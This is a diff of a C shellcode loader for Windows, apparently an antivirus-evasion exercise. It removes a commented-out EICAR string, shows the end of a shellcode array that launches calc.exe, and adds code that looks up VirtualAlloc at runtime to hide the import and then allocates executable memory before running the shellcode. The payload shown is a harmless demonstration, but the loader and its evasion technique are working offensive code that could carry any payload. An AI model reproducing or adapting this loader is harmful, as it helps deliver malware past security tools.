@@ -51,11 +51,6 @@ int main() {
 	//------------------------------------------------------------------------------------------//
 
 
-	// Debugging message
-	// char debugMessage[] = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
-	// rot13(debugMessage);
-	// printf("Debug Message: %s\n", debugMessage);
-
 	// Show the user a message
 	const char* eicar = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
 	MessageBoxA(NULL, eicar, "Fancy looking string : )", MB_OK | MB_ICONINFORMATION);
@@ -84,9 +79,16 @@ int main() {
 		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
+
 	// Allocate memory for shellcode using VirtualAlloc
 	HANDLE hVirtualAlloc;
 	SIZE_T dwSize = sizeof(buf);
+	//prepare api-stuff via runtime resolution
+	HANDLE hKern = GetModuleHandleA("kernel32.dll");
+	PVOID pVirtualAlloc = GetProcAddress(hKern, "VirtualAlloc");
+	fnVirtualAlloc pVirtualAllocFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
+	hVirtualAlloc = pVirtualAllocFunc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
 	// press enter to continue
 	printf("Press Enter to allocate and execute shellcode...\n");
 	getchar();
